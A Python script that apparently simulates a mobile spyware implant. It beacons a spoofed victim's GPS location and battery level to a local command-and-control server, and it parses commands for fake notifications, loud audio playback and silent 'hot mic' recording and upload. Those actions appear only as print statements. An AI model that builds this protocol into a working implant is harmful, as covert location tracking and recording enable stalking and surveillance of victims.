import urllib.request
import urllib.parse
import json
import time
import random

SERVER_URL = "http://127.0.0.1:8000/battery_report"
UPLOAD_URL = "http://127.0.0.1:8000/upload_audio"
IMPLANT_KEY = "DeltaForce2027"
DEVICE_ID = "SIMULATED_VICTIM_PHONE"

# Start at an arbitrary GPS coordinate (e.g. Riga)
lat = 56.9496
lon = 24.1052
battery = 100

print("="*60)
print(f"[*] STARTING FULL IMPLANT SIMULATOR")
print(f"[*] Target C2: {SERVER_URL}")
print(f"[*] Spoofed Device ID: {DEVICE_ID}")
print("="*60)

while True:
    data = {
        "implant_key": IMPLANT_KEY,
        "device_id": DEVICE_ID,
        "level": battery,
        "lat": lat,
        "lon": lon
    }
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')

    sleep_interval = 3
    
    try:
        req = urllib.request.Request(SERVER_URL, data=encoded_data)
        with urllib.request.urlopen(req, timeout=5) as response:
            resp_body = response.read().decode('utf-8')
            cmds = json.loads(resp_body)
            
            sleep_interval = cmds.get("next_ping_seconds", 5)
            notif_state = cmds.get("notif_state", 0)
            notif_text = cmds.get("notif_text", "")
            play_audio = cmds.get("play_audio", 0)
            record_audio = cmds.get("record_audio", 0)

            print(f"[>] TELEMETRY SENT | Battery: {battery}% | GPS: {lat:.6f}, {lon:.6f}")
            print(f"[<] C2 COMMANDS RECEIVED:")
            print(f"    - Interval: {sleep_interval}s")
            
            if notif_state == 1:
                print(f"    [!] ALERT RECEIVED: Displaying Fake Notification -> '{notif_text}'")
                
            if play_audio == 1:
                print(f"    [🔊] BBLAST TRIGGERED: Playing maximum volume audio track natively!")
                
            if record_audio == 1:
                print(f"    [🎤] HOT MIC TRIGGERED: Silently recording 10s audio...")
                time.sleep(2)
                # Fake Upload mechanism (We just simulate a long wait for now)
                print(f"    [⬆️] UPLOADING AUDIO FILE to {UPLOAD_URL}...")
                
            print("-" * 40)
            
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        sleep_interval = 5

    # Simulate walking (drift GPS)
    lat += random.uniform(-0.0002, 0.0005)
    lon += random.uniform(0.0001, 0.0008)
    
    # Simulate battery drain
    if random.random() < 0.1 and battery > 1:
        battery -= 1

    time.sleep(sleep_interval)
